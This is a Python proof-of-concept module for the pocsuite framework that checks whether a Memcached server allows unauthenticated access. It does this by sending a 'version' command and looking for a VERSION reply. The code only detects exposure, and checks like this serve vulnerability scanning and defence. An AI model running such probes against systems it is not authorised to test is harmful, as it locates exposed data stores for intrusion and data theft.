#!/usr/bin/env python
# -*- coding:utf-8 -*-
# checked
import socket

from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = 'ssvid-89692'
    version = '1'
    author = ['Anonymous']
    vulDate = '2015-10-26'
    createDate = '2015-10-26'
    updateDate = '2015-10-26'
    references = ['']
    name = 'Memcached 未授权访问 PoC'
    appPowerLink = 'http://memcached.org/'
    appName = 'Memcached'
    appVersion = 'All'
    vulType = 'Unauthorized access'
    desc = '''
        Memcached 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。
    '''

    samples = ['']

    def _verify(self):
        result = {}
        version_payload = 'version\n'
        s = socket.socket()
        socket.setdefaulttimeout(10)
        try:
            host = self.url.split(":")[0]
            port = int(self.url.split(":")[1])
            s.connect((host, port))
            s.send(version_payload)
            recvdata = s.recv(15)
            if recvdata and 'VERSION' in recvdata:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Port'] = port
        except:
            pass
        s.close()
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
